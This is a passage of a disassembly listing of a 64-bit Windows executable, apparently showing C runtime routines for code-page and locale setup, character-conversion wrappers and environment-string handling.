   140009549:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   140009550:	eb 64                	jmp    0x1400095b6
   140009552:	b9 05 00 00 00       	mov    $0x5,%ecx
   140009557:	e8 34 07 00 00       	call   0x140009c90
   14000955c:	90                   	nop
   14000955d:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140009564:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140009569:	48 3b 1e             	cmp    (%rsi),%rbx
   14000956c:	74 3e                	je     0x1400095ac
   14000956e:	48 85 db             	test   %rbx,%rbx
   140009571:	74 22                	je     0x140009595
   140009573:	83 c8 ff             	or     $0xffffffff,%eax
   140009576:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   14000957a:	83 f8 01             	cmp    $0x1,%eax
   14000957d:	75 16                	jne    0x140009595
   14000957f:	48 8d 05 2a 4b 01 00 	lea    0x14b2a(%rip),%rax        # 0x14001e0b0
   140009586:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000958b:	48 3b c8             	cmp    %rax,%rcx
   14000958e:	74 05                	je     0x140009595
   140009590:	e8 7b ea ff ff       	call   0x140008010
   140009595:	48 8b 06             	mov    (%rsi),%rax
   140009598:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000959f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400095a4:	f0 ff 00             	lock incl (%rax)
   1400095a7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400095ac:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400095b1:	e8 2e 07 00 00       	call   0x140009ce4
   1400095b6:	48 85 db             	test   %rbx,%rbx
   1400095b9:	74 13                	je     0x1400095ce
   1400095bb:	48 8b c3             	mov    %rbx,%rax
   1400095be:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400095c3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400095c8:	48 83 c4 20          	add    $0x20,%rsp
   1400095cc:	5f                   	pop    %rdi
   1400095cd:	c3                   	ret
   1400095ce:	e8 1d dd ff ff       	call   0x1400072f0
   1400095d3:	90                   	nop
   1400095d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400095d8:	80 3d f5 58 01 00 00 	cmpb   $0x0,0x158f5(%rip)        # 0x14001eed4
   1400095df:	75 4c                	jne    0x14000962d
   1400095e1:	48 8d 0d 08 4e 01 00 	lea    0x14e08(%rip),%rcx        # 0x14001e3f0
   1400095e8:	48 89 0d d1 58 01 00 	mov    %rcx,0x158d1(%rip)        # 0x14001eec0
   1400095ef:	48 8d 05 ba 4a 01 00 	lea    0x14aba(%rip),%rax        # 0x14001e0b0
   1400095f6:	48 8d 0d e3 4c 01 00 	lea    0x14ce3(%rip),%rcx        # 0x14001e2e0
   1400095fd:	48 89 05 c4 58 01 00 	mov    %rax,0x158c4(%rip)        # 0x14001eec8
   140009604:	48 89 0d ad 58 01 00 	mov    %rcx,0x158ad(%rip)        # 0x14001eeb8
   14000960b:	e8 8c e2 ff ff       	call   0x14000789c
   140009610:	4c 8d 0d b1 58 01 00 	lea    0x158b1(%rip),%r9        # 0x14001eec8
   140009617:	4c 8b c0             	mov    %rax,%r8
   14000961a:	b2 01                	mov    $0x1,%dl
   14000961c:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   140009621:	e8 86 fc ff ff       	call   0x1400092ac
   140009626:	c6 05 a7 58 01 00 01 	movb   $0x1,0x158a7(%rip)        # 0x14001eed4
   14000962d:	b0 01                	mov    $0x1,%al
   14000962f:	48 83 c4 28          	add    $0x28,%rsp
   140009633:	c3                   	ret
   140009634:	48 83 ec 28          	sub    $0x28,%rsp
   140009638:	e8 43 e2 ff ff       	call   0x140007880
   14000963d:	48 8d 15 84 58 01 00 	lea    0x15884(%rip),%rdx        # 0x14001eec8
   140009644:	48 8b c8             	mov    %rax,%rcx
   140009647:	48 83 c4 28          	add    $0x28,%rsp
   14000964b:	e9 cc fe ff ff       	jmp    0x14000951c
   140009650:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140009655:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000965a:	56                   	push   %rsi
   14000965b:	57                   	push   %rdi
   14000965c:	41 54                	push   %r12
   14000965e:	41 56                	push   %r14
   140009660:	41 57                	push   %r15
   140009662:	48 83 ec 40          	sub    $0x40,%rsp
   140009666:	48 8b 05 93 49 01 00 	mov    0x14993(%rip),%rax        # 0x14001e000
   14000966d:	48 33 c4             	xor    %rsp,%rax
   140009670:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140009675:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009678:	33 c0                	xor    %eax,%eax
   14000967a:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000967f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009683:	48 8b f2             	mov    %rdx,%rsi
   140009686:	e8 11 f9 ff ff       	call   0x140008f9c
   14000968b:	33 db                	xor    %ebx,%ebx
   14000968d:	8b f8                	mov    %eax,%edi
   14000968f:	85 c0                	test   %eax,%eax
   140009691:	0f 84 51 02 00 00    	je     0x1400098e8
   140009697:	4c 8d 25 62 4e 01 00 	lea    0x14e62(%rip),%r12        # 0x14001e500
   14000969e:	44 8b f3             	mov    %ebx,%r14d
   1400096a1:	49 8b c4             	mov    %r12,%rax
   1400096a4:	8d 6b 01             	lea    0x1(%rbx),%ebp
   1400096a7:	39 38                	cmp    %edi,(%rax)
   1400096a9:	0f 84 46 01 00 00    	je     0x1400097f5
   1400096af:	44 03 f5             	add    %ebp,%r14d
   1400096b2:	48 83 c0 30          	add    $0x30,%rax
   1400096b6:	41 83 fe 05          	cmp    $0x5,%r14d
   1400096ba:	72 eb                	jb     0x1400096a7
   1400096bc:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   1400096c2:	0f 84 25 01 00 00    	je     0x1400097ed
   1400096c8:	0f b7 cf             	movzwl %di,%ecx
   1400096cb:	ff 15 c7 6a 00 00    	call   *0x6ac7(%rip)        # 0x140010198
   1400096d1:	85 c0                	test   %eax,%eax
   1400096d3:	0f 84 14 01 00 00    	je     0x1400097ed
   1400096d9:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   1400096de:	3b f8                	cmp    %eax,%edi
   1400096e0:	75 26                	jne    0x140009708
   1400096e2:	48 89 46 04          	mov    %rax,0x4(%rsi)
   1400096e6:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400096ed:	89 5e 18             	mov    %ebx,0x18(%rsi)
   1400096f0:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   1400096f4:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400096f8:	0f b7 c3             	movzwl %bx,%eax
   1400096fb:	b9 06 00 00 00       	mov    $0x6,%ecx
   140009700:	66 f3 ab             	rep stos %ax,(%rdi)
   140009703:	e9 d6 01 00 00       	jmp    0x1400098de
   140009708:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000970d:	8b cf                	mov    %edi,%ecx
   14000970f:	ff 15 9b 6a 00 00    	call   *0x6a9b(%rip)        # 0x1400101b0
   140009715:	85 c0                	test   %eax,%eax
   140009717:	0f 84 c4 00 00 00    	je     0x1400097e1
   14000971d:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140009721:	33 d2                	xor    %edx,%edx
   140009723:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140009729:	e8 d2 59 00 00       	call   0x14000f100
   14000972e:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   140009733:	89 7e 04             	mov    %edi,0x4(%rsi)
   140009736:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   14000973d:	0f 85 94 00 00 00    	jne    0x1400097d7
   140009743:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   140009748:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   14000974c:	74 2c                	je     0x14000977a
   14000974e:	38 59 01             	cmp    %bl,0x1(%rcx)
   140009751:	74 27                	je     0x14000977a
   140009753:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140009757:	0f b6 11             	movzbl (%rcx),%edx
   14000975a:	3b d0                	cmp    %eax,%edx
   14000975c:	77 14                	ja     0x140009772
   14000975e:	2b c2                	sub    %edx,%eax
   140009760:	8d 7a 01             	lea    0x1(%rdx),%edi
   140009763:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   140009766:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   14000976b:	03 fd                	add    %ebp,%edi
   14000976d:	48 2b d5             	sub    %rbp,%rdx
   140009770:	75 f4                	jne    0x140009766
   140009772:	48 83 c1 02          	add    $0x2,%rcx
   140009776:	38 19                	cmp    %bl,(%rcx)
   140009778:	75 d4                	jne    0x14000974e
   14000977a:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   14000977e:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140009783:	80 08 08             	orb    $0x8,(%rax)
   140009786:	48 03 c5             	add    %rbp,%rax
   140009789:	48 2b cd             	sub    %rbp,%rcx
   14000978c:	75 f5                	jne    0x140009783
   14000978e:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140009791:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140009797:	74 2e                	je     0x1400097c7
   140009799:	83 e9 04             	sub    $0x4,%ecx
   14000979c:	74 20                	je     0x1400097be
   14000979e:	83 e9 0d             	sub    $0xd,%ecx
   1400097a1:	74 12                	je     0x1400097b5
   1400097a3:	3b cd                	cmp    %ebp,%ecx
   1400097a5:	74 05                	je     0x1400097ac
   1400097a7:	48 8b c3             	mov    %rbx,%rax
   1400097aa:	eb 22                	jmp    0x1400097ce
   1400097ac:	48 8b 05 4d 89 00 00 	mov    0x894d(%rip),%rax        # 0x140012100
   1400097b3:	eb 19                	jmp    0x1400097ce
   1400097b5:	48 8b 05 3c 89 00 00 	mov    0x893c(%rip),%rax        # 0x1400120f8
   1400097bc:	eb 10                	jmp    0x1400097ce
   1400097be:	48 8b 05 2b 89 00 00 	mov    0x892b(%rip),%rax        # 0x1400120f0
   1400097c5:	eb 07                	jmp    0x1400097ce
   1400097c7:	48 8b 05 1a 89 00 00 	mov    0x891a(%rip),%rax        # 0x1400120e8
   1400097ce:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   1400097d5:	eb 02                	jmp    0x1400097d9
   1400097d7:	8b eb                	mov    %ebx,%ebp
   1400097d9:	89 6e 08             	mov    %ebp,0x8(%rsi)
   1400097dc:	e9 13 ff ff ff       	jmp    0x1400096f4
   1400097e1:	39 1d e9 56 01 00    	cmp    %ebx,0x156e9(%rip)        # 0x14001eed0
   1400097e7:	0f 85 fb 00 00 00    	jne    0x1400098e8
   1400097ed:	83 c8 ff             	or     $0xffffffff,%eax
   1400097f0:	e9 fd 00 00 00       	jmp    0x1400098f2
   1400097f5:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400097f9:	33 d2                	xor    %edx,%edx
   1400097fb:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140009801:	e8 fa 58 00 00       	call   0x14000f100
   140009806:	41 8b c6             	mov    %r14d,%eax
   140009809:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   14000980e:	4c 8d 3d db 4c 01 00 	lea    0x14cdb(%rip),%r15        # 0x14001e4f0
   140009815:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000981b:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   14000981f:	49 c1 e3 04          	shl    $0x4,%r11
   140009823:	4d 03 cb             	add    %r11,%r9
   140009826:	49 8b d1             	mov    %r9,%rdx
   140009829:	41 38 19             	cmp    %bl,(%r9)
   14000982c:	74 3e                	je     0x14000986c
   14000982e:	38 5a 01             	cmp    %bl,0x1(%rdx)
   140009831:	74 39                	je     0x14000986c
   140009833:	44 0f b6 02          	movzbl (%rdx),%r8d
   140009837:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   14000983b:	44 3b c0             	cmp    %eax,%r8d
   14000983e:	77 24                	ja     0x140009864
   140009840:	45 8d 50 01          	lea    0x1(%r8),%r10d
   140009844:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   14000984b:	73 17                	jae    0x140009864
   14000984d:	41 8a 07             	mov    (%r15),%al
   140009850:	44 03 c5             	add    %ebp,%r8d
   140009853:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   140009858:	44 03 d5             	add    %ebp,%r10d
   14000985b:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   14000985f:	44 3b c0             	cmp    %eax,%r8d
   140009862:	76 e0                	jbe    0x140009844
   140009864:	48 83 c2 02          	add    $0x2,%rdx
   140009868:	38 1a                	cmp    %bl,(%rdx)
   14000986a:	75 c2                	jne    0x14000982e
   14000986c:	49 83 c1 08          	add    $0x8,%r9
   140009870:	4c 03 fd             	add    %rbp,%r15
   140009873:	4c 2b f5             	sub    %rbp,%r14
   140009876:	75 ae                	jne    0x140009826
   140009878:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000987b:	89 6e 08             	mov    %ebp,0x8(%rsi)
   14000987e:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   140009884:	74 29                	je     0x1400098af
   140009886:	83 ef 04             	sub    $0x4,%edi
   140009889:	74 1b                	je     0x1400098a6
   14000988b:	83 ef 0d             	sub    $0xd,%edi
   14000988e:	74 0d                	je     0x14000989d
   140009890:	3b fd                	cmp    %ebp,%edi
   140009892:	75 22                	jne    0x1400098b6
   140009894:	48 8b 1d 65 88 00 00 	mov    0x8865(%rip),%rbx        # 0x140012100
   14000989b:	eb 19                	jmp    0x1400098b6
   14000989d:	48 8b 1d 54 88 00 00 	mov    0x8854(%rip),%rbx        # 0x1400120f8
   1400098a4:	eb 10                	jmp    0x1400098b6
   1400098a6:	48 8b 1d 43 88 00 00 	mov    0x8843(%rip),%rbx        # 0x1400120f0
   1400098ad:	eb 07                	jmp    0x1400098b6
   1400098af:	48 8b 1d 32 88 00 00 	mov    0x8832(%rip),%rbx        # 0x1400120e8
   1400098b6:	4c 2b de             	sub    %rsi,%r11
   1400098b9:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400098c0:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   1400098c4:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400098c9:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   1400098cd:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   1400098d2:	66 89 02             	mov    %ax,(%rdx)
   1400098d5:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   1400098d9:	48 2b cd             	sub    %rbp,%rcx
   1400098dc:	75 ef                	jne    0x1400098cd
   1400098de:	48 8b ce             	mov    %rsi,%rcx
   1400098e1:	e8 ce f7 ff ff       	call   0x1400090b4
   1400098e6:	eb 08                	jmp    0x1400098f0
   1400098e8:	48 8b ce             	mov    %rsi,%rcx
   1400098eb:	e8 2c f7 ff ff       	call   0x14000901c
   1400098f0:	33 c0                	xor    %eax,%eax
   1400098f2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400098f7:	48 33 cc             	xor    %rsp,%rcx
   1400098fa:	e8 11 98 ff ff       	call   0x140003110
   1400098ff:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140009904:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   140009908:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   14000990c:	49 8b e3             	mov    %r11,%rsp
   14000990f:	41 5f                	pop    %r15
   140009911:	41 5e                	pop    %r14
   140009913:	41 5c                	pop    %r12
   140009915:	5f                   	pop    %rdi
   140009916:	5e                   	pop    %rsi
   140009917:	c3                   	ret
   140009918:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000991d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009922:	57                   	push   %rdi
   140009923:	48 83 ec 40          	sub    $0x40,%rsp
   140009927:	8b da                	mov    %edx,%ebx
   140009929:	41 8b f9             	mov    %r9d,%edi
   14000992c:	48 8b d1             	mov    %rcx,%rdx
   14000992f:	41 8b f0             	mov    %r8d,%esi
   140009932:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140009937:	e8 ac f1 ff ff       	call   0x140008ae8
   14000993c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009941:	0f b6 d3             	movzbl %bl,%edx
   140009944:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   140009949:	75 18                	jne    0x140009963
   14000994b:	85 f6                	test   %esi,%esi
   14000994d:	74 10                	je     0x14000995f
   14000994f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140009954:	48 8b 08             	mov    (%rax),%rcx
   140009957:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   14000995b:	85 c6                	test   %eax,%esi
   14000995d:	75 04                	jne    0x140009963
   14000995f:	33 c0                	xor    %eax,%eax
   140009961:	eb 05                	jmp    0x140009968
   140009963:	b8 01 00 00 00       	mov    $0x1,%eax
   140009968:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000996d:	74 0c                	je     0x14000997b
   14000996f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009974:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000997b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009980:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140009985:	48 83 c4 40          	add    $0x40,%rsp
   140009989:	5f                   	pop    %rdi
   14000998a:	c3                   	ret
   14000998b:	cc                   	int3
   14000998c:	8b d1                	mov    %ecx,%edx
   14000998e:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140009994:	33 c9                	xor    %ecx,%ecx
   140009996:	45 33 c0             	xor    %r8d,%r8d
   140009999:	e9 7a ff ff ff       	jmp    0x140009918
   14000999e:	cc                   	int3
   14000999f:	cc                   	int3
   1400099a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400099a4:	ff 15 0e 68 00 00    	call   *0x680e(%rip)        # 0x1400101b8
   1400099aa:	48 89 05 47 55 01 00 	mov    %rax,0x15547(%rip)        # 0x14001eef8
   1400099b1:	ff 15 09 68 00 00    	call   *0x6809(%rip)        # 0x1400101c0
   1400099b7:	48 89 05 42 55 01 00 	mov    %rax,0x15542(%rip)        # 0x14001ef00
   1400099be:	b0 01                	mov    $0x1,%al
   1400099c0:	48 83 c4 28          	add    $0x28,%rsp
   1400099c4:	c3                   	ret
   1400099c5:	cc                   	int3
   1400099c6:	cc                   	int3
   1400099c7:	cc                   	int3
   1400099c8:	b8 ac de 00 00       	mov    $0xdeac,%eax
   1400099cd:	3b c8                	cmp    %eax,%ecx
   1400099cf:	77 4f                	ja     0x140009a20
   1400099d1:	74 44                	je     0x140009a17
   1400099d3:	b8 33 c4 00 00       	mov    $0xc433,%eax
   1400099d8:	3b c8                	cmp    %eax,%ecx
   1400099da:	77 1f                	ja     0x1400099fb
   1400099dc:	74 39                	je     0x140009a17
   1400099de:	8b c1                	mov    %ecx,%eax
   1400099e0:	83 e8 2a             	sub    $0x2a,%eax
   1400099e3:	74 32                	je     0x140009a17
   1400099e5:	2d 02 c4 00 00       	sub    $0xc402,%eax
   1400099ea:	74 2b                	je     0x140009a17
   1400099ec:	83 e8 01             	sub    $0x1,%eax
   1400099ef:	74 26                	je     0x140009a17
   1400099f1:	83 e8 01             	sub    $0x1,%eax
   1400099f4:	74 21                	je     0x140009a17
   1400099f6:	83 f8 03             	cmp    $0x3,%eax
   1400099f9:	eb 1a                	jmp    0x140009a15
   1400099fb:	8b c1                	mov    %ecx,%eax
   1400099fd:	2d 35 c4 00 00       	sub    $0xc435,%eax
   140009a02:	74 13                	je     0x140009a17
   140009a04:	2d 63 12 00 00       	sub    $0x1263,%eax
   140009a09:	74 48                	je     0x140009a53
   140009a0b:	2d 12 08 00 00       	sub    $0x812,%eax
   140009a10:	74 05                	je     0x140009a17
   140009a12:	83 f8 01             	cmp    $0x1,%eax
   140009a15:	75 02                	jne    0x140009a19
   140009a17:	33 d2                	xor    %edx,%edx
   140009a19:	48 ff 25 a8 67 00 00 	rex.W jmp *0x67a8(%rip)        # 0x1400101c8
   140009a20:	8b c1                	mov    %ecx,%eax
   140009a22:	2d ad de 00 00       	sub    $0xdead,%eax
   140009a27:	74 ee                	je     0x140009a17
   140009a29:	83 e8 01             	sub    $0x1,%eax
   140009a2c:	74 e9                	je     0x140009a17
   140009a2e:	83 e8 01             	sub    $0x1,%eax
   140009a31:	74 e4                	je     0x140009a17
   140009a33:	83 e8 01             	sub    $0x1,%eax
   140009a36:	74 df                	je     0x140009a17
   140009a38:	83 e8 01             	sub    $0x1,%eax
   140009a3b:	74 da                	je     0x140009a17
   140009a3d:	83 e8 01             	sub    $0x1,%eax
   140009a40:	74 d5                	je     0x140009a17
   140009a42:	83 e8 01             	sub    $0x1,%eax
   140009a45:	74 d0                	je     0x140009a17
   140009a47:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   140009a4c:	74 c9                	je     0x140009a17
   140009a4e:	83 f8 01             	cmp    $0x1,%eax
   140009a51:	75 c6                	jne    0x140009a19
   140009a53:	83 e2 08             	and    $0x8,%edx
   140009a56:	eb c1                	jmp    0x140009a19
   140009a58:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009a5d:	57                   	push   %rdi
   140009a5e:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140009a64:	45 8b d9             	mov    %r9d,%r11d
   140009a67:	83 f8 01             	cmp    $0x1,%eax
   140009a6a:	49 8b d8             	mov    %r8,%rbx
   140009a6d:	b8 ac de 00 00       	mov    $0xdeac,%eax
   140009a72:	41 0f 96 c2          	setbe  %r10b
   140009a76:	33 ff                	xor    %edi,%edi
   140009a78:	3b c8                	cmp    %eax,%ecx
   140009a7a:	77 41                	ja     0x140009abd
   140009a7c:	74 78                	je     0x140009af6
   140009a7e:	b8 33 c4 00 00       	mov    $0xc433,%eax
   140009a83:	3b c8                	cmp    %eax,%ecx
   140009a85:	77 1f                	ja     0x140009aa6
   140009a87:	74 6d                	je     0x140009af6
   140009a89:	8b c1                	mov    %ecx,%eax
   140009a8b:	83 e8 2a             	sub    $0x2a,%eax
   140009a8e:	74 66                	je     0x140009af6
   140009a90:	2d 02 c4 00 00       	sub    $0xc402,%eax
   140009a95:	74 5f                	je     0x140009af6
   140009a97:	83 e8 01             	sub    $0x1,%eax
   140009a9a:	74 5a                	je     0x140009af6
   140009a9c:	83 e8 01             	sub    $0x1,%eax
   140009a9f:	74 55                	je     0x140009af6
   140009aa1:	83 f8 03             	cmp    $0x3,%eax
   140009aa4:	eb 48                	jmp    0x140009aee
   140009aa6:	8b c1                	mov    %ecx,%eax
   140009aa8:	2d 35 c4 00 00       	sub    $0xc435,%eax
   140009aad:	74 47                	je     0x140009af6
   140009aaf:	2d 63 12 00 00       	sub    $0x1263,%eax
   140009ab4:	74 40                	je     0x140009af6
   140009ab6:	2d 12 08 00 00       	sub    $0x812,%eax
   140009abb:	eb 2c                	jmp    0x140009ae9
   140009abd:	8b c1                	mov    %ecx,%eax
   140009abf:	2d ad de 00 00       	sub    $0xdead,%eax
   140009ac4:	74 30                	je     0x140009af6
   140009ac6:	83 e8 01             	sub    $0x1,%eax
   140009ac9:	74 2b                	je     0x140009af6
   140009acb:	83 e8 01             	sub    $0x1,%eax
   140009ace:	74 26                	je     0x140009af6
   140009ad0:	83 e8 01             	sub    $0x1,%eax
   140009ad3:	74 21                	je     0x140009af6
   140009ad5:	83 e8 01             	sub    $0x1,%eax
   140009ad8:	74 1c                	je     0x140009af6
   140009ada:	83 e8 01             	sub    $0x1,%eax
   140009add:	74 17                	je     0x140009af6
   140009adf:	83 e8 01             	sub    $0x1,%eax
   140009ae2:	74 12                	je     0x140009af6
   140009ae4:	2d 35 1f 00 00       	sub    $0x1f35,%eax
   140009ae9:	74 0b                	je     0x140009af6
   140009aeb:	83 f8 01             	cmp    $0x1,%eax
   140009aee:	74 06                	je     0x140009af6
   140009af0:	0f ba f2 07          	btr    $0x7,%edx
   140009af4:	eb 02                	jmp    0x140009af8
   140009af6:	8b d7                	mov    %edi,%edx
   140009af8:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140009afd:	45 84 d2             	test   %r10b,%r10b
   140009b00:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140009b05:	4c 8b c0             	mov    %rax,%r8
   140009b08:	4c 0f 45 c7          	cmovne %rdi,%r8
   140009b0c:	4c 0f 45 cf          	cmovne %rdi,%r9
   140009b10:	74 07                	je     0x140009b19
   140009b12:	48 85 c0             	test   %rax,%rax
   140009b15:	74 02                	je     0x140009b19
   140009b17:	89 38                	mov    %edi,(%rax)
   140009b19:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   140009b1e:	4c 8b c3             	mov    %rbx,%r8
   140009b21:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   140009b26:	45 8b cb             	mov    %r11d,%r9d
   140009b29:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009b2e:	5f                   	pop    %rdi
   140009b2f:	48 ff 25 9a 66 00 00 	rex.W jmp *0x669a(%rip)        # 0x1400101d0
   140009b36:	cc                   	int3
   140009b37:	cc                   	int3
   140009b38:	48 8b c4             	mov    %rsp,%rax
   140009b3b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009b3f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009b43:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009b47:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009b4b:	41 56                	push   %r14
   140009b4d:	48 83 ec 40          	sub    $0x40,%rsp
   140009b51:	ff 15 81 66 00 00    	call   *0x6681(%rip)        # 0x1400101d8
   140009b57:	33 f6                	xor    %esi,%esi
   140009b59:	48 8b d8             	mov    %rax,%rbx
   140009b5c:	48 85 c0             	test   %rax,%rax
   140009b5f:	75 07                	jne    0x140009b68
   140009b61:	33 c0                	xor    %eax,%eax
   140009b63:	e9 c3 00 00 00       	jmp    0x140009c2b
   140009b68:	48 8b eb             	mov    %rbx,%rbp
   140009b6b:	66 39 30             	cmp    %si,(%rax)
   140009b6e:	74 1d                	je     0x140009b8d
   140009b70:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140009b74:	48 ff c0             	inc    %rax
   140009b77:	66 39 74 45 00       	cmp    %si,0x0(%rbp,%rax,2)
   140009b7c:	75 f6                	jne    0x140009b74
   140009b7e:	48 8d 6c 45 00       	lea    0x0(%rbp,%rax,2),%rbp
   140009b83:	48 83 c5 02          	add    $0x2,%rbp
   140009b87:	66 39 75 00          	cmp    %si,0x0(%rbp)
   140009b8b:	75 e3                	jne    0x140009b70
   140009b8d:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140009b92:	48 2b eb             	sub    %rbx,%rbp
   140009b95:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140009b9a:	48 83 c5 02          	add    $0x2,%rbp
   140009b9e:	48 d1 fd             	sar    $1,%rbp
   140009ba1:	4c 8b c3             	mov    %rbx,%r8
   140009ba4:	44 8b cd             	mov    %ebp,%r9d
   140009ba7:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140009bab:	33 d2                	xor    %edx,%edx
   140009bad:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140009bb2:	33 c9                	xor    %ecx,%ecx
   140009bb4:	e8 9f fe ff ff       	call   0x140009a58
   140009bb9:	4c 63 f0             	movslq %eax,%r14
   140009bbc:	49 8b ce             	mov    %r14,%rcx
   140009bbf:	85 c0                	test   %eax,%eax
   140009bc1:	75 0b                	jne    0x140009bce
   140009bc3:	48 8b cb             	mov    %rbx,%rcx
   140009bc6:	ff 15 14 66 00 00    	call   *0x6614(%rip)        # 0x1400101e0
   140009bcc:	eb 93                	jmp    0x140009b61
   140009bce:	e8 0d 0a 00 00       	call   0x14000a5e0
   140009bd3:	48 8b f8             	mov    %rax,%rdi
   140009bd6:	48 85 c0             	test   %rax,%rax
   140009bd9:	75 09                	jne    0x140009be4
   140009bdb:	33 c9                	xor    %ecx,%ecx
   140009bdd:	e8 2e e4 ff ff       	call   0x140008010
   140009be2:	eb df                	jmp    0x140009bc3
   140009be4:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140009be9:	44 8b cd             	mov    %ebp,%r9d
   140009bec:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140009bf1:	4c 8b c3             	mov    %rbx,%r8
   140009bf4:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140009bf9:	33 d2                	xor    %edx,%edx
   140009bfb:	33 c9                	xor    %ecx,%ecx
   140009bfd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140009c02:	e8 51 fe ff ff       	call   0x140009a58
   140009c07:	85 c0                	test   %eax,%eax
   140009c09:	75 0a                	jne    0x140009c15
   140009c0b:	48 8b cf             	mov    %rdi,%rcx
   140009c0e:	e8 fd e3 ff ff       	call   0x140008010
   140009c13:	eb 0a                	jmp    0x140009c1f
   140009c15:	33 c9                	xor    %ecx,%ecx
   140009c17:	e8 f4 e3 ff ff       	call   0x140008010
   140009c1c:	48 8b f7             	mov    %rdi,%rsi
   140009c1f:	48 8b cb             	mov    %rbx,%rcx
   140009c22:	ff 15 b8 65 00 00    	call   *0x65b8(%rip)        # 0x1400101e0
   140009c28:	48 8b c6             	mov    %rsi,%rax
   140009c2b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
